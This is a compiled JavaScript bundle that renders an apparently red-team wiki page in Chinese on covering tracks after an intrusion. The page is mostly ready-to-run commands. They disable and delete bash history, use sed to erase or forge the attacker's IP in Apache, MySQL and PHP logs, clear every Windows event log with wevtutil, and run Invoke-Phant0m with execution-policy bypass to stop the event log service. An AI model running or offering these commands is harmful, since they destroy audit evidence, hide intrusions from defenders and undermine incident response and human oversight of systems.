(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[18],{160:function(e,a,t){"use strict";t.r(a),function(e){t.d(a,"default",(function(){return d}));var n,s=t(95),c=(t(139),t(0),t(96));function r(){return(r=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function o(e,a){if(null==e)return{};var t,n,s=function(e,a){if(null==e)return{};var t,n,s={},c=Object.keys(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||(s[t]=e[t]);return s}(e,a);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(s[t]=e[t])}return s}(n="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&n(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var l,b,p=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(c.b)("div",a)}},m={},i="wrapper";function d(e){var a=e.components,t=o(e,["components"]);return Object(c.b)(i,r({},m,t,{components:a,mdxType:"MDXLayout"}),Object(c.b)("h1",{className:"__internal",id:"linux日志处理"},"Linux日志处理",Object(c.b)("a",r({parentName:"h1"},{href:"#linux%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("h2",{className:"__internal",id:"bash日志处理"},"Bash日志处理",Object(c.b)("a",r({parentName:"h2"},{href:"#bash%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"bash去掉history记录，让系统不记录history")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",r({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",r({parentName:"code"},{className:"token builtin class-name"}),"export")," ",Object(c.b)("span",r({parentName:"code"},{className:"token assign-left variable"}),Object(c.b)("span",r({parentName:"span"},{className:"token environment constant"}),"HISTSIZE")),Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),Object(c.b)("span",r({parentName:"code"},{className:"token number"}),"0"),"\n",Object(c.b)("span",r({parentName:"code"},{className:"token builtin class-name"}),"export")," ",Object(c.b)("span",r({parentName:"code"},{className:"token assign-left variable"}),Object(c.b)("span",r({parentName:"span"},{className:"token environment constant"}),"HISTFILE")),Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),"/dev/null"))),Object(c.b)("p",null,"history命令的清除，也是对~/.bash_history进行定向清除"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",r({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",r({parentName:"code"},{className:"token function"}),"history"),"\n",Object(c.b)("span",r({parentName:"code"},{className:"token function"}),"rm")," -rf ~/.bash_history"))),Object(c.b)("h2",{className:"__internal",id:"web日志处理"},"Web日志处理",Object(c.b)("a",r({parentName:"h2"},{href:"#web%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,"如apache的access.log,error.log。"),Object(c.b)("p",null,"直接将日志清除过于明显,一般使用sed进行定向清除或伪造"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",r({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",r({parentName:"code"},{className:"token function"}),"sed")," -i -e ‘/192.169.1.3/d’\n",Object(c.b)("span",r({parentName:"code"},{className:"token function"}),"sed")," –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/access.log\n",Object(c.b)("span",r({parentName:"code"},{className:"token function"}),"sed")," –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/error_log\n",Object(c.b)("span",r({parentName:"code"},{className:"token comment"}),"#其中192.168.1.3是我们的IP，192.168.1.4使我们伪造的IP")))),Object(c.b)("p",null,Object(c.b)("a",r({parentName:"p"},{href:"http://www.ruanyifeng.com/blog/2012/01/a_bash_script_of_apache_log_analysis.html",target:"_blank"}),"处理apache日志的bash脚本")),Object(c.b)("h2",{className:"__internal",id:"syslog处理"},"syslog处理",Object(c.b)("a",r({parentName:"h2"},{href:"#syslog%E5%A4%84%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"/var/log/wtmp")),Object(c.b)("p",null," ",Object(c.b)("strong",{parentName:"p"},"/var/run/utmp")),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"/var/log/secure")),Object(c.b)("h2",{className:"__internal",id:"mysql日志文件"},"MySQL日志文件",Object(c.b)("a",r({parentName:"h2"},{href:"#mysql%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",r({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-bash"}),"log-error",Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),"/var/log/mysql/mysql_error.log\t",Object(c.b)("span",r({parentName:"code"},{className:"token comment"}),"#错误日志"),"\n",Object(c.b)("span",r({parentName:"code"},{className:"token assign-left variable"}),"log"),Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),"/var/log/mysql/mysql.log\t\t\t",Object(c.b)("span",r({parentName:"code"},{className:"token comment"}),"#最好注释掉，会产生大量的日志，包括每一个执行的sql及环境变量的改变等等"),"\nlog-bin",Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),"/var/log/mysql/mysql_bin.log\t",Object(c.b)("span",r({parentName:"code"},{className:"token comment"}),"# 用于备份恢复，或主从复制.这里不涉及。"),"\nlog-slow-queries",Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),"/var/log/mysql/mysql_slow.log\t",Object(c.b)("span",r({parentName:"code"},{className:"token comment"}),"#慢查询日志"),"\nlog-error",Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),"/var/log/mysql/mysqld.log\npid-file",Object(c.b)("span",r({parentName:"code"},{className:"token operator"}),"="),"/var/run/mysqld/mysqld.pid\n"))),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",r({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",r({parentName:"code"},{className:"token function"}),"sed")," –i ",Object(c.b)("span",r({parentName:"code"},{className:"token string"}),"'s/192.168.1.3/192.168.1.4/g'"),"/var/log/mysql/mysql_slow.log"))),Object(c.b)("h2",{className:"__internal",id:"php日志处理"},Object(c.b)("strong",{parentName:"h2"},"php日志处理"),Object(c.b)("a",r({parentName:"h2"},{href:"#php%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",r({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",r({parentName:"code"},{className:"token function"}),"sed")," –i ",Object(c.b)("span",r({parentName:"code"},{className:"token string"}),"'s/192.168.1.3/192.168.1.4/g'"),"/var/log/apache/php_error.log "))),Object(c.b)("h2",{className:"__internal",id:"清除脚本"},Object(c.b)("strong",{parentName:"h2"},"清除脚本:"),Object(c.b)("a",r({parentName:"h2"},{href:"#%E6%B8%85%E9%99%A4%E8%84%9A%E6%9C%AC","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,Object(c.b)("a",r({parentName:"p"},{href:"https://github.com/JonGates/jon",target:"_blank"}),"https://github.com/JonGates/jon")," "),Object(c.b)("h1",{className:"__internal",id:"windows日志处理"},"Windows日志处理",Object(c.b)("a",r({parentName:"h1"},{href:"#windows%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("h2",{className:"__internal",id:"一、wevtutilfor循环清除所有日志"},"一、wevtutil+for循环清除所有日志",Object(c.b)("a",r({parentName:"h2"},{href:"#%E4%B8%80%E3%80%81wevtutilfor%E5%BE%AA%E7%8E%AF%E6%B8%85%E9%99%A4%E6%89%80%E6%9C%89%E6%97%A5%E5%BF%97","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"cmd"},Object(c.b)("pre",r({parentName:"div"},{className:"language-cmd"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-cmd"}),'for /F "tokens=*" %a in (\'wevtutil.exe el\') DO wevtutil.exe cl "%a"'))),Object(c.b)("h2",{className:"__internal",id:"二、-ps批量删日志"},"二、 ps批量删日志",Object(c.b)("a",r({parentName:"h2"},{href:"#%E4%BA%8C%E3%80%81-ps%E6%89%B9%E9%87%8F%E5%88%A0%E6%97%A5%E5%BF%97","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,"如果弹回来的是一个ps的shell,直接用ps来批量删日志 "),Object(c.b)("div",{className:"rcpress-highlight","data-language":"cmd"},Object(c.b)("pre",r({parentName:"div"},{className:"language-cmd"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-cmd"}),'PS C:\\> wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}'))),Object(c.b)("h2",{className:"__internal",id:"三、运行ps脚本"},"三、运行ps脚本",Object(c.b)("a",r({parentName:"h2"},{href:"#%E4%B8%89%E3%80%81%E8%BF%90%E8%A1%8Cps%E8%84%9A%E6%9C%AC","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",r({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",r({parentName:"pre"},{className:"language-bash"}),"powershell –exec bypass –Command ",Object(c.b)("span",r({parentName:"code"},{className:"token string"}),"\"& {Import-Module 'C:\\Invoke-Phant0m.ps1';Invoke-Phant0m}\""),"\n",Object(c.b)("span",r({parentName:"code"},{className:"token comment"}),"#win日志服务此时就会停止工作了")))))}d.isMDXComponent=!0,d=Object(s.hot)(e)(d),(l="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(l.register(p,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\del-log.md"),l.register(m,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\del-log.md"),l.register(i,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\del-log.md"),l.register(d,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\del-log.md")),(b="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&b(e)}.call(this,t(23)(e))}}]);